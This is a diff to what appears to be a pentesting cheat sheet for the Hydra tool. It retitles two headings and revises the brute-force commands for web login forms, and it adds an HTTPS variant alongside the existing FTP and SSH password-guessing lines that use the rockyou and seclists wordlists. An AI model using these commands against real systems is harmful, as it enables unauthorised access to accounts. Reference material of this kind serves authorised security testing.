@@ -36,7 +36,7 @@ hydra -l username -P passwords.txt ftp://10.0.0.1
 
 <br />
 
-## HTTP GET request (Authorization, WWW-Authenticate)
+## HTTP GET Request (Authorization, WWW-Authenticate)
 
 ```sh
 # Crack username and password
@@ -90,12 +90,16 @@ hydra -l username -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1:2222
 
 <br />
 
-## Web form
+## Web Form
 
 ```sh
 # Crack username
-hydra -L /usr/share/seclists/Usernames/Names/names.txt -p secret 10.0.0.1 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
+hydra -L /usr/share/seclists/Usernames/Names/names.txt -p secret 10.0.0.1 http-post-form "/login:username=^USER^&password=^PASS^:incorrect"
 
 # Crack password
-hydra -l username -P /usr/share/wordlists/rockyou.txt 10.0.0.1 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
+hydra -l username -P /usr/share/wordlists/rockyou.txt 10.0.0.1 http-post-form "/login:username=^USER^&password=^PASS^:incorrect"
+
+
+# For HTTPS
+hydra -l username -P passwords.txt 10.0.0.1 https-post-form "/login:username=^USER^&password=^PASS^:incorrect"
 ```
